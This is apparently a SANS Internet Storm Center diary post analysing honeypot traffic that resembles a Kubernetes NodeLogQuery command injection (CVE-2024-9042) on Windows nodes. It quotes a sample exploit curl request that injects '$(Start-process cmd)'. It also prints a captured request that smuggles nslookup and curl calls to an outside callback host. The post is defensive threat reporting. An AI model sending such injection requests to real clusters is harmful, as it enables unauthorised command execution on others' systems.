---
title: Possible exploit variant for CVE-2024-9042 (Kubernetes OS Command Injection), (Wed, Dec 10th)
url: https://isc.sans.edu/diary/rss/32554
source: SANS Internet Storm Center, InfoCON: green
date: 2025-12-10
fetch_date: 2025-12-11T03:27:25.979065
---

# Possible exploit variant for CVE-2024-9042 (Kubernetes OS Command Injection), (Wed, Dec 10th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Guy Bruneau](/handler_list.html#guy-bruneau "Guy Bruneau")

Threat Level: [green](/infocon.html)

* [previous](/diary/32550)
* [next](/diary/32556)

My next class:

|  |  |  |
| --- | --- | --- |
| [Network Monitoring and Threat Detection In-Depth](https://www.sans.org/event/sec503-europe-online-december-2025/course/network-monitoring-threat-detection) | Online | Central European Time | Dec 15th - Dec 20th 2025 |

# [Possible exploit variant for CVE-2024-9042 (Kubernetes OS Command Injection)](/forums/diary/Possible%2Bexploit%2Bvariant%2Bfor%2BCVE20249042%2BKubernetes%2BOS%2BCommand%2BInjection/32554/)

**Published**: 2025-12-10. **Last Updated**: 2025-12-10 15:25:08 UTC
**by** [Johannes Ullrich](https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

[0 comment(s)](/diary/Possible%2Bexploit%2Bvariant%2Bfor%2BCVE20249042%2BKubernetes%2BOS%2BCommand%2BInjection/32554/#comments)

Last year, Kubernetes fixed a command injection vulnerability in the Kubernetes NodeLogQuery feature ([CVE-2024-9042](/vuln.html?cve=2024-9042)) [1]. To exploit the vulnerability, several conditions had to be met:

* The vulnerable node had to run Windows
* The attacker had to have permissions to read logs
* The NogeLogQuery feature had to be enabled (at least at the time, it was in "Beta" and not enabled by default)

The sample exploits posted at the time passed the OS command as a GET parameter. For example [2]

> curl  "<Kubernetes API Proxy server IP>/api/v1/nodes/<NODE name>/proxy/logs/?query=nssm&pattern=’\$(Start-process cmd)’"

The exploit uses '$(oscommand)' as a "pattern", and sends a query to the "/logs/" endpoint. Overall, a classic OS command injection issue.

Starting a couple of days ago, I spotted some requests sent to our honeypots that followed a similar pattern. It isn't clear to me if this is essentially the same vulnerability or something completely different. The exploit used the "logs" endpoint and achieves command injection via the "$(oscommand)" pattern, but this time around it includes the command as part of the path. There is a chance that something like this will work, as path elements are often used by APIs.

Google suggests CVE-2024-9042, but this may be something completely different. Please let me know if you have any ideas. Here is a sample request as captured by a honeypot:

> GET /$(nslookup%20-q=cname%20[redacted].bxss.me||curl%20[redacted].bxss.me)/logs/
> accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
> accept-encoding: gzip,deflate
> user-agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
> host: [redacted]
> connection: Keep-alive

[1] https://www.openwall.com/lists/oss-security/2025/01/16/1
[2] https://www.akamai.com/blog/security-research/kubernetes-log-query-rce-windows

--
Johannes B. Ullrich, Ph.D. , Dean of Research, [SANS.edu](https://sans.edu)
[Twitter](https://jbu.me/164)|

Keywords: [kubernetes os command injections](/tag.html?tag=kubernetes os command injections)

[0 comment(s)](/diary/Possible%2Bexploit%2Bvariant%2Bfor%2BCVE20249042%2BKubernetes%2BOS%2BCommand%2BInjection/32554/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Network Monitoring and Threat Detection In-Depth](https://www.sans.org/event/sec503-europe-online-december-2025/course/network-monitoring-threat-detection) | Online | Central European Time | Dec 15th - Dec 20th 2025 |

* [previous](/diary/32550)
* [next](/diary/32556)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)